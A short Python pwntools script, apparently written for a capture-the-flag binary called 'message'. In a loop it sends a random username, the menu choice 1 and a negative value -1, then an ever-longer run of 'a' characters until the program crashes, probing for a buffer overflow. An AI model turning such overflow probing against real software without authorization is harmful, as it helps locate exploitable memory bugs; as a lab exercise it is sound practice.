from pwn import *
import random
from time import sleep

payload = "a"*64

i = 1
while(True):
	p = process("./message")
	p.recvuntil("Enter username: ")
	s = random.randint(1,10000)
	print(s)
	p.sendline(str(s))
	print(p.recv())
	p.sendline("1")
	print(p.recv())
	p.sendline("-1")
	print(p.recv())
	payload += "aaaa"
	print(len(payload),payload)
	p.sendline(payload)

	sleep(0.1)
	flags = p.recv()
	if(flags[:9]=="*** Error"):
		break
	print(flags)